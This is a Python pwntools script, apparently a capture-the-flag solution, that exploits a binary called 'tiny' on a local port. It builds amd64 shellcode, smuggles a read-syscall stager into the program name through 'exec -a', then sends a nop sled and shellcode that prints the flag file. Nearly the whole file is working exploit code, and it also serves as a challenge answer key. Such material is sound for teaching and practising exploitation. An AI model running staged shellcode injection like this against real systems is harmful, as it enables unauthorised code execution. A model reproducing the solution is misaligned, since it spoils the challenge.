#!/usr/bin/env python3
# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "pwntools>=4.15.0",
# ]
# ///
#Solution by iretq <me@iretq.dev> https://github.com/48cf

from pwn import *

HOST = 'localhost'
PORT = 50000

context.arch = "amd64"
payload1 = asm("""
    xor eax, eax
    mov dl, 0x7f
    syscall
    push 1
    ret
""")

payload2 = asm('nop; ret; nop')

payload3 = asm('nop' + shellcraft.amd64.linux.cat("flag"))

"""
io = process([argv0], executable="./tiny")
"""

io = remote(HOST, PORT, level='warn')

#payload1_wrap = 'bash -c "exec -a $\'%s\' ./tiny"' % ''.join(f'\\x{x:02x}' for x in payload1)
payload1_wrap = 'exec -a $\'%s\' ./tiny' % ''.join(f'\\x{x:02x}' for x in payload1)

print(payload1_wrap)
print(payload2.hex())
print(payload3.hex())

payload2_wrap = 'echo -e "%s"' % ''.join(f'\\x{x:02x}' for x in payload2)
payload3_wrap = 'echo -e "%s"' % ''.join(f'\\x{x:02x}' for x in payload3)

print(payload2_wrap)
print(payload3_wrap)

print('(%s; %s) | %s' % (payload2_wrap, payload3_wrap, payload1_wrap))

io.sendline(payload1_wrap.encode())
io.send(payload2+payload3)
print(io.recvall())
